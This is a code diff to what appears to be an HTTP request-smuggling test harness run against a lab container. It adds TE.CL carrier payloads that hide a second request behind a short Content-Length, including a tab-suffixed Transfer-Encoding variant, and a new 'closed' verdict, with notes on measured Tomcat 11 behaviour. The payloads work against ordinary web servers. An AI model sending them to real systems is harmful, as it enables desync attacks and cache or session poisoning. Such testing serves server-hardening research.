@@ -47,6 +47,12 @@ from phage.evo.http1 import _responses, _status_code  # noqa: E402
 SMUGGLED = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"
 DEFAULT_BODY = b"0\r\n\r\n" + SMUGGLED
 
+# The TE.CL carrier: one chunk whose DATA is the hidden request, then the terminator.
+# The declared Content-Length covers only the chunk-size line, so a server framing by
+# Content-Length resumes parsing exactly at "GET /SMUGGLED" and answers twice.
+TECL_SIZE_LINE = b"%x\r\n" % len(SMUGGLED)
+TECL_BODY = TECL_SIZE_LINE + SMUGGLED + b"\r\n0\r\n\r\n"
+
 
 class Variant(NamedTuple):
     """One framing experiment: a header block, and optionally a body shape.
@@ -54,11 +60,21 @@ class Variant(NamedTuple):
     `body` is the carrier's payload. Leave it None for the header experiments, where
     the question is which spelling of a value the server acts on. Set it when the
     disagreement is about what ENDS the body rather than what starts it, because the
-    header is identical in those and only the terminator differs."""
+    header is identical in those and only the terminator differs.
+
+    `direction` names which of the two desyncs the row asks about, and they are not the
+    same question. A CL.TE row declares a Content-Length covering the whole carrier and
+    asks whether the server honors the Transfer-Encoding anyway; a second framed request
+    means it does. A TE.CL row declares a SHORT Content-Length and asks the opposite,
+    whether the server ignores a well-formed Transfer-Encoding; a second framed request
+    THERE means it does. Same verdict word, inverted meaning, which is why the join has
+    to read this field instead of the label."""
 
     label: str
     header: bytes
     body: Optional[bytes] = None
+    content_length: Optional[int] = None  # override; default is the real body length
+    direction: str = "CL.TE"  # which parser disagreement this row asks about
 
 
 # The framing experiments. The first group varies the VALUE of Transfer-Encoding: a
@@ -97,6 +113,26 @@ VARIANTS = [
     Variant(
         "0x-prefixed size", b"Transfer-Encoding: chunked", b"0x0\r\n\r\n" + SMUGGLED
     ),
+    # The other direction. Everything above asks "does it honor the Transfer-Encoding".
+    # These ask "does it IGNORE one". A short Content-Length lands the cursor exactly at
+    # the start of the hidden request, so a server framing by Content-Length answers
+    # twice and one framing by Transfer-Encoding answers once. Tomcat is why this exists:
+    # it accepts both headers and frames by Content-Length, which RFC 9112 section 6.1
+    # says it must not, and no row above could express that.
+    Variant(
+        "TE.CL chunked",
+        b"Transfer-Encoding: chunked",
+        TECL_BODY,
+        content_length=len(TECL_SIZE_LINE),
+        direction="TE.CL",
+    ),
+    Variant(
+        "TE.CL chunked<TAB>",
+        b"Transfer-Encoding: chunked\t",
+        TECL_BODY,
+        content_length=len(TECL_SIZE_LINE),
+        direction="TE.CL",
+    ),
 ]
 
 CONTAINER = "phage_matrix_target"  # suffixed per spec so specs can run side by side
@@ -123,17 +159,30 @@ def _send(port: int, payload: bytes, settle: float = 2.5):
     return out, None
 
 
-def build(hdr: bytes, body: Optional[bytes] = None) -> bytes:
-    """One carrier request whose body hides a second request behind a zero-length chunk."""
+def build(
+    hdr: bytes, body: Optional[bytes] = None, content_length: Optional[int] = None
+) -> bytes:
+    """One carrier request whose body hides a second request.
+
+    Content-Length defaults to the real body length, which is what a CL.TE row needs:
+    honest by that measure, so only a server acting on the Transfer-Encoding frames a
+    second request. A TE.CL row overrides it with a short value, so only a server
+    IGNORING the Transfer-Encoding frames one."""
     body = DEFAULT_BODY if body is None else body
+    cl = len(body) if content_length is None else content_length
     return (
         b"POST /carrier HTTP/1.1\r\nHost: lab\r\n"
-        b"Content-Length: %d\r\n%s\r\n\r\n" % (len(body), hdr)
+        b"Content-Length: %d\r\n%s\r\n\r\n" % (cl, hdr)
     ) + body
 
 
-def probe(port: int, hdr: bytes, body: Optional[bytes] = None):
-    return _send(port, build(hdr, body))
+def probe(
+    port: int,
+    hdr: bytes,
+    body: Optional[bytes] = None,
+    content_length: Optional[int] = None,
+):
+    return _send(port, build(hdr, body, content_length))
 
 
 def control(port: int):
@@ -155,10 +204,35 @@ def trusted(ctl: bytes) -> bool:
     return bool(ctl) and _responses(ctl) >= 2
 
 
+def _refuses_reuse(resp: bytes) -> bool:
+    """Did the first response say the connection is over?"""
+    head = resp.split(b"\r\n\r\n", 1)[0]
+    for line in head.split(b"\r\n")[1:]:
+        k, sep, v = line.partition(b":")
+        if sep and k.strip().lower() == b"connection" and b"close" in v.lower():
+            return True
+    return False
+
+
 def classify(resp: bytes) -> str:
     """SMUGGLE  the backend framed the hidden request as a second request
     reject    it refused the message outright
-    CL-safe   it framed exactly one request, reading the body by Content-Length"""
+    closed    it answered once and then hung the connection up
+    CL-safe   it framed exactly one request, reading the body by Content-Length
+
+    `closed` exists because `CL-safe` used to absorb it, and the two are not the same
+    fact. Counting responses can only reach two on a connection the server keeps open,
+    so a server that closes has made the counter structurally unable to produce a
+    positive for THIS row, and calling that a clean Content-Length framing is a verdict
+    the measurement cannot support. It is also a different security posture: a server
+    that frames by Content-Length is safe against CL.TE and exposed to TE.CL, while a
+    server that closes has no pooled connection left to poison either way.
+
+    Measured 2026-09-06 on Tomcat 11, which is why this is here. It honors a lone
+    Transfer-Encoding (a 0-chunk carrier frames two requests), it pipelines happily (a
+    short Content-Length with a whole request after it frames three), and when BOTH
+    framing headers arrive it answers once with `Connection: close`. The old vocabulary
+    reported that as CL-safe, which reads as "frames by Content-Length" and is wrong."""
     if not resp:
         return "no-response"
     if _responses(resp) >= 2:
@@ -173,6 +247,8 @@ def classify(resp: bytes) -> str:
         return "unknown"
     if 400 <= code < 600:
         return f"reject {code}"
+    if _refuses_reuse(resp):
+        return "closed"
     return "CL-safe"
 
 
@@ -240,7 +316,7 @@ def run(spec) -> dict:
                     "verdicts untrusted"
                 )
             for v in VARIANTS:
-                resp, err = probe(spec["port"], v.header, v.body)
+                resp, err = probe(spec["port"], v.header, v.body, v.content_length)
                 verdict = classify(resp) if not err else f"error: {err}"
                 row["results"][v.label] = verdict
                 out.append(f"    {v.label:20} {verdict}")
